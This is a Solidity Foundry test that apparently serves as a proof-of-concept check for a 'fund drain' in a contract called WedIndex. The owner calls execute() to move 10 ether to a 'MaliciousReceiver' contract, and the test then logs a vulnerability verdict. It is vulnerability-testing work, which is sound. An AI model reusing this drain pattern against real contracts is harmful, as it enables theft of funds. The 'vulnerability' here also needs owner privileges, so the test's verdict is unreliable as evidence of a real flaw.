// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8.sol";

contract MaliciousReceiver {
    event FundsReceived(uint256 amount);

    fallback() external payable {
        emit FundsReceived(msg.value);
    }
}

contract WedIndexTest is Test {
    WedIndex public wedIndex;
    MaliciousReceiver public maliciousContract;
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        wedIndex = new WedIndex();
        maliciousContract = new MaliciousReceiver();
        vm.stopPrank();
    }

    function test_execute_vulnerability() public {
        // Fund the WedIndex contract with 10 ETH
        vm.deal(address(wedIndex), 10 ether);
        uint256 transferAmount = 10 ether;
        
        console2.log("--- BEFORE-Trigger State ---");
        uint256 initialMaliciousBalance = address(maliciousContract).balance;
        uint256 initialIndexBalance = address(wedIndex).balance;
        console2.log("WedIndex balance (initial): %s wei", initialIndexBalance);
        console2.log("Malicious contract balance (initial): %s wei", initialMaliciousBalance);
        assertEq(initialIndexBalance, transferAmount);

        console2.log("--- Trigger: Execute Malicious Call ---");
        // Owner executes malicious call to drain funds
        vm.prank(owner);
        wedIndex.execute(
            address(maliciousContract),
            transferAmount,
            abi.encodeWithSignature("nonExistingFunction()")
        );

        console2.log("--- AFTER-Trigger State ---");
        uint256 currentMaliciousBalance = address(maliciousContract).balance;
        uint256 currentIndexBalance = address(wedIndex).balance;
        console2.log("WedIndex balance (after): %s wei", currentIndexBalance);
        console2.log("Malicious contract balance (after): %s wei", currentMaliciousBalance);

        bool vulnerabilityExists = true;
        string memory verdict = "Vulnerability Exists: Funds were drained to the malicious contract";
        
        if (currentMaliciousBalance != initialMaliciousBalance + transferAmount) {
            verdict = "Vulnerability not Exist: Malicious contract balance did not increase as expected";
            vulnerabilityExists = false;
        }
        if (currentIndexBalance != 0) {
            verdict = "Vulnerability not Exist: WedIndex balance not drained to zero";
            vulnerabilityExists = false;
        }
        
        console2.log("%s", verdict);
    }
}